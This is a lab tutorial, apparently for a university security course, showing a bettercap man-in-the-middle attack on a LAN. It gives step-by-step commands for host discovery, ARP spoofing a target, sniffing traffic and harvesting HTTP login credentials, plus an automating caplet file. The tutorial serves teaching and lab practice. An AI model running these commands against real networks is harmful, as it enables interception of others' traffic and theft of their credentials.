## Man in the Middle Attack [bettercap]

<img src="https://www.kali.org/tools/bettercap/images/bettercap-logo.svg" style="width:120px;"/>


A Man-in-the-Middle (MitM) attack is a type of cyberattack where an attacker secretly intercepts communication between two parties. ARP spoofing, a common technique used in MitM attacks, involves manipulating the Address Resolution Protocol (ARP) to trick devices into sending traffic to the attacker instead of the intended recipient. This allows the attacker to eavesdrop on the communication, steal sensitive information, or even modify the data being transmitted.

bettercap is a powerful, easily extensible and portable framework written in Go which aims to offer to security researchers, red teamers and reverse engineers an easy to use, all-in-one solution with all the features they might possibly need for performing reconnaissance and attacking WiFi networks, Bluetooth Low Energy devices, wireless HID devices and Ethernet networks.


make sure bettercap is install, otherwise run `sudo apt update` then `sudo apt install bettercap`

you may need to enable IP Forwarding, to allow Kali machine to act as a gateway `echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward`

---

### 1- Launch bettercap
`bettercap -iface eth0`
- `-iface` Specify the network interface

In bettercap console, use `help` to list all available modules with their status

You can use the command `ip link show` from terminal to list all available network interface cards

you can use the command `help` to list all available modules with their states


---
### 2- Start the Prober Module
`net.probe on`

The prober module send different types of probe packets to all hosts on the network to enable the recon module to detect them.

---
### 3- Start the Recon Module
`net.recon on`

Recon module is used to discover hosts on the network by reading the ARP table. The recon module is automatically started when you run the prober module.

You can view the connected hosts using `net.show`

---
### 4- Spoof the ARP table

you will use the arp spoof module to manipulate the Address Resolution Protocol or ARP table of the router.

`set arp.spoof.fullduplex true`
we set the mode to fullduplex to spoof the targets and the gateway (router)

Spoof a specific target `set arp.spoof.targets 192.168.70.5`

to get the current paramaters `get arp.spoof*`

start the spoofing `arp.spoof on`

---
### 5- Sniff the target packets
`net.sniff on`

You will monitor all traffic send by the host `192.168.70.5`


from the victim machine go to `http://vulnweb.com`
click on `http://testhtml5.vulnweb.com` click `login` and enter any credentials.

from the kali you can see the HTTP POST request payload and harvest credentials, including the username and password.


The `net.sniff.local` option controls whether to sniff network traffic originating from and destined to the machine on which Bettercap is running.

---
### 6- Create caplet file

Caplet file can be used to automate the sniffing process. Create a file names sniff.cap with the following content.

```
net.probe on
net.recon on
set arp.spoof.fullduplex true 
set arp.spoof.targets 192.168.70.5
arp.spoof on
set net.sniff.local true
net.sniff on
```

You can start the MITM attack by running `bettercap -iface eth0 -caplet sniff.cap`


---
### 7- Sniff a specific packets
You can apply **Berkeley Packet Filter** (BPF) to refine the traffic you want to capture, for example:

- Filter port `set net.sniff.filter "tcp port 80"`
- Filter in/out traffic `set net.sniff.filter "host vulnweb.com"`
- Filter incoming traffic `set net.sniff.filter "src host vulnweb.com"`
- Filter outgoing traffic `set net.sniff.filter "dst host vulnweb.com"`
- Filter host and port `set net.sniff.filter "host vulnweb.com and port 8080"`
- Exclude `set net.sniff.filter "not src host googe.com"`



---
> For more questions email: nagy@aast.edu
